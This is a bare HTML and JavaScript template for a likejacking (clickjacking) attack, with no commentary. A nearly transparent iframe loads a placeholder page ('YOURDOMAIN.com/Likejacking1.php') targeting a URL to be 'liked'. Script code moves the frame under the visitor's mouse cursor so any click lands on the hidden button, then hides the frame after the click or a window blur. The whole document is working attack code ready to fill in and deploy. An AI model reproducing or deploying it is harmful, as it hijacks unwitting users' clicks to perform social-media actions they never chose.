
<style>body{margin:0px;padding:0px;}</style>

<div style="overflow:hidden;width:100px;height:100px;position:relative;" id=v>
<iframe id="cksl7" name="cksl7" src="http://YOURDOMAIN.com/Likejacking1.php?id=%22URL_TO_LIKEJACK%22" style="border:0px;left:-1px;top:-1px;position:absolute;filter:alpha(opacity=0);z-index:1;opacity:0.7;overflow:hidden;width:1920px;height:971px;"></iframe></div>

<script>
var d=document;
if(!d.all)d.captureEvents(Event.MOUSEMOVE);
d.onmousemove=function(e){var i=d.getElementById("v").style;i.left=d.all?event.clientX+d.body.scrollLeft:e.pageX;i.top=d.all?event.clientY+d.body.scrollTop:e.pageY;};



window.onbeforeunload=function(){document.getElementById( "v" ).setTimeout("stop();",1000);};

</script>
<script src="https://code.jquery.com/jquery-2.1.3.min.js"></script>
<script>



document.onclick = myClickHandler;

function myClickHandler() { setTimeout(function (){document.getElementById( "v" ).style.display="none";},150); }

$(function(){
   var i=-1;
   $("#cksl7").hover(function(){
      i=$(this).closest("#v").attr("qjid");
      },
      function()
      {i=-1;}
   );
   $(window).focus();
   $(window).blur(function(){
      myClickHandler();
   });
});
$(window).focus()
</script>
